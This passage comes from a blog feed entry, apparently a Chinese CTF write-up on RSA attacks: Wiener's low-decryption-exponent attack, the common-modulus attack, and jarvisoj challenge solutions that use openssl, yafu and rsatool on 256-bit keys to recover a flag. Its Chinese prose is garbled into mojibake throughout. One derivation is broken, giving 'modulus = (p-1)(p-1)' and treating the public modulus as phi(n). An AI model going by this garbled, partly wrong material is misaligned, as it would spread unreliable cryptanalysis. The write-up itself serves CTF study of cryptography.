id="ä½è§£å¯†æŒ‡æ•°æ”»å‡»"><a href="#ä½è§£å¯†æŒ‡æ•°æ”»å‡»" class="headerlink" title="ä½è§£å¯†æŒ‡æ•°æ”»å‡»"></a>ä½è§£å¯†æŒ‡æ•°æ”»å‡»</h2><p>é¢˜ç›®ç‰¹å¾ï¼šeçœ‹èµ·æ¥å¾ˆå¤§å°±è¡Œäº†ã€‚</p><blockquote><p>dä¸ºeæ¨¡phi(n)çš„é€†å…ƒï¼Œeå¾ˆå¤§é‚£ä¹ˆdå°±å°</p></blockquote><p>è„šæœ¬ï¼š<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a></p><blockquote><p>è¿™é‡Œæ³¨æ„ä¸€ä¸ªç»†èŠ‚é—®é¢˜ï¼Œå¦‚æœåœ¨è¿è¡Œè„šæœ¬çš„æ—¶å€™æŠ¥é”™ï¼Œè¯·åœ¨è„šæœ¬å‰åŠ ä¸Šï¼š<br>import   sys<br>sys.setrecursionlimit(10000000)</p></blockquote><h2 id="å…±æ¨¡æ”»å‡»"><a href="#å…±æ¨¡æ”»å‡»" class="headerlink" title="å…±æ¨¡æ”»å‡»"></a>å…±æ¨¡æ”»å‡»</h2><p>é¢˜ç›®ç‰¹å¾ï¼šè‹¥å¹²æ¬¡åŠ å¯†ï¼Œæ¯æ¬¡néƒ½ä¸€æ ·ï¼Œæ˜æ–‡æ ¹æ®é¢˜æ„ä¹Ÿä¸€æ ·å³å¯ã€‚</p><p>ä½¿ç”¨ç›¸åŒæ¨¡æ•°nå¯¹ç›¸åŒçš„å¯†æ–‡mè¿›è¡ŒåŠ å¯†(eä¸åŒ)ï¼Œå¯ä»¥ä½¿ç”¨å…±æ¨¡æ”»å‡»æ±‚å‡ºæ˜æ–‡ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1 â‰¡ m^e1(mod n)</span><br><span class="line">c2 â‰¡ m^e2(mod n)</span><br></pre></td></tr></table></figure></p><p>æ˜“çŸ¥: <code>gcd(e1,e2) = 1</code><br>æœ‰: <code>s*e1 + r*e2 = 1</code><br>æ¨å‡ºï¼š<code>s*e1 + r*e2 â‰¡ 1 (mod n)</code><br>ç”¨æ‰©å±•ç‰ˆæ¬§å‡ é‡Œå¾—ç®—æ³•å¯æ±‚å¾—sã€r</p><p>æ„é€ è¡¨è¾¾å¼ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1^s â‰¡ m^(e1*s)(mod n)</span><br><span class="line">c2^r â‰¡ m^(e2*r)(mod n)</span><br></pre></td></tr></table></figure></p><p>è”ç«‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1^s * c2^r â‰¡ m^[(e1*s)+(e2*r)] (mod n)</span><br><span class="line">c1^s * c2^r â‰¡ m^1 (mod n)</span><br></pre></td></tr></table></figure></p><p>è§£å‡ºæ˜æ–‡ï¼š<code>m = (c1^s * c2^r)(mod n)</code></p><h1 id="ä¸€äº›ä¾‹é¢˜"><a href="#ä¸€äº›ä¾‹é¢˜" class="headerlink" title="ä¸€äº›ä¾‹é¢˜"></a>ä¸€äº›ä¾‹é¢˜</h1><h2 id="jarvisoj-Medium-RSA"><a href="#jarvisoj-Medium-RSA" class="headerlink" title="jarvisoj: Medium RSA"></a><a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">jarvisoj: Medium RSA</a></h2><p>ç»™äº†å…¬é’¥å’ŒåŠ å¯†åçš„flagæ–‡ä»¶ï¼Œå…ˆç”¨opensslæå–å…¬é’¥ä¿¡æ¯ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ openssl  rsa -pubin -text -modulus -in warmup -in pubkey.pem </span><br><span class="line">RSA Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p><p>åˆ†æ, ç»™äº†æˆ‘ä»¬mï¼Œ ä¹Ÿå°±æ˜¯phi(n)ï¼Œ é€šè¿‡å…¶æ±‚å‡ºp,q(â‘ )ï¼Œç„¶åå°†næ±‚å‡º(â‘¡),é€šè¿‡è¡¨è¾¾å¼â‘¢å°†eçš„é€†å…ƒdæ±‚å‡ºï¼Œä»è€Œå°†å¯†æ–‡è§£å‡º(â‘¤)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â‘ ï¼šmodulus = (p-1)(p-1)</span><br><span class="line">â‘¡ï¼š n = p * q</span><br><span class="line">â‘¢ï¼š e*d â‰¡ 1 (mod modulus)</span><br><span class="line">â‘£ï¼š åŠ å¯†ï¼šc â‰¡ m^e (mod n)</span><br><span class="line">â‘¤ï¼š è§£å¯†ï¼šm â‰¡ c^d (mod n)</span><br></pre></td></tr></table></figure></p><p>å°è¯•factoræ— è§£ã€‚<br>ç»§ç»­å°è¯•ç”¨yafuåˆ†è§£mï¼Œ ä¹Ÿå°±æ˜¯phi(n),å¾—åˆ°<code>p</code>å’Œ<code>q</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P39 = 319576316814478949870590164193048041239</span><br><span class="line">P39 = 275127860351348928173285174381581152299</span><br></pre></td></tr></table></figure></p><p><img src="https://static.zybuluo.com/Passer6y/ujevdi5cdxz1g9jzqe2kfun6/image_1d9eqhob11k6013iqqjilb7r9.png" alt="image_1d9eqhob11k6013iqqjilb7r9.png-17.8kB"></p><p>æ ¹æ®<code>e p q</code>ç”Ÿæˆç§é’¥æ–‡ä»¶,è¿™é‡Œç”¨<a href="https://github.com/ohroot/rsatools" target="_blank" rel="noopener">rsatools</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 rsatool.py -o private.pem -e 65537 -p 319576316814478949870590164193048041239 -q 275127860351348928173285174381581152299</span><br></pre></td></tr></table></figure><p>æ¥ç€æ‹¿ç€è¿™ä¸ªç§é’¥ç”¨opensslè§£å¯†ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsautl -decrypt -in flag.enc -inkey private.pem </span><br><span class="line">PCTF&#123;256b_i5_m3dium&#125;</span><br></pre></td></tr></table></figure></p><h2 id="jarvisoj-Hard-RSA"><a href="#jarvisoj-Hard-RSA" class="headerlink" title="jarvisoj: Hard RSA"></a><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">jarvisoj: Hard RSA</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ openssl  rsa -pubin -text -modulus -in warmup -in pubkey.pem</span><br><span class="line">RSA Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 2 (0x2)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgEC</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶ï¼Œè¿™é‡ŒåŠ å¯†æŒ‡æ•°eä¸º2ï¼Œé‡‡ç”¨ä½åŠ å¯†æŒ‡æ•°æ”»å‡»ã€‚</p><p>å‚è€ƒï¼š</p><ol><li><a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">jarvisoj</a></li><li><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">CTFä¸­RSAçš„å¸¸è§æ”»å‡»æ–¹æ³•</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘æ‰“æ¯”èµ›é¢‘é¢‘é‡åˆ°å„ç§å­¦è¿‡åˆä¸ä¼šçš„å¯†ç å­¦â€¦ æŠ½äº†ç‚¹æ—¶é—´æ£é¼“äº†ä¸€ä¸‹å¸¸è§rsaæ”»å‡»æ–¹æ³•çš„åŸç†ï¼Œä»¥åæœ‰æ—¶é—´ç»§ç»­å¡«å‘&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://0day.design/tags/Crypto/"/>
    
  </entry>
  
</feed>
